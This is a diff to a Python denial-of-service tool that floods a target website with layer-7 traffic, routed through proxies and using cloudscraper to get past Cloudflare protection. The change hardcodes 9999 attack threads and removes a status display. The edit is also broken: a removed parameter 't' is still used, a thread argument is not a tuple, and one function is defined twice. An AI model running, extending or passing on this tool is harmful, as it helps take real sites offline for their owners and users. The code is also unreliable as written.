@@ -54,9 +54,7 @@ def countdown(t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     while True:
         if (until - datetime.datetime.now()).total_seconds() > 0:
-            stdout.flush()
-            stdout.write("\r " + Fore.MAGENTA + "[*]" + Fore.WHITE + " Attack status => " + str(
-                (until - datetime.datetime.now()).total_seconds()) + " sec left ")
+            pass
         else:
             stdout.flush()
             stdout.write(
@@ -887,10 +885,10 @@ def AttackCFB(target, until_datetime, scraper):
 # endregion
 
 # region PXCFB
-def LaunchPXCFB(target, thread, t):
+def LaunchPXCFB(target):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     scraper = cloudscraper.create_scraper()
-    for _ in range(int(thread)):
+    for _ in range(int(9999)):
         try:
             thd = threading.Thread(target=AttackPXCFB, args=(target, until, scraper))
             thd.start()
@@ -1174,9 +1172,9 @@ def AttackCFB(target, until_datetime, scraper):
 
 def attackPXCFB(target, t, threads):
     for i in range(int(threads)):
-        threading.Thread(target=LaunchPXCFB, args=(target, t)).start()
+        threading.Thread(target=LaunchPXCFB, args=(target)).start()
 
-def LaunchPXCFB(target, t):
+def LaunchPXCFB(target):
     prox = open("./http.txt", 'r').read().split('\n')
     proxy = random.choice(prox).strip().split(":")
     timelol = time.time() + int(t)
@@ -1731,7 +1729,7 @@ def welcome():
             target, thread, t = get_info_l7()
             timer = threading.Thread(target=countdown, args=(t,))
             timer.start()
-            LaunchPXCFB(target, thread, t)
+            LaunchPXCFB(target)
             timer.join()
     elif "pps" in cmdl or 'PPS' in cmdl:
         target, thread, t = get_info_l7()
@@ -1978,7 +1976,7 @@ if __name__ == '__main__':
         if get_proxies():
             timer = threading.Thread(target=countdown, args=(t,))
             timer.start()
-            LaunchPXCFB(target, thread, t)
+            LaunchPXCFB(target)
             timer.join()
     elif method == "get":
         timer = threading.Thread(target=countdown, args=(t,))
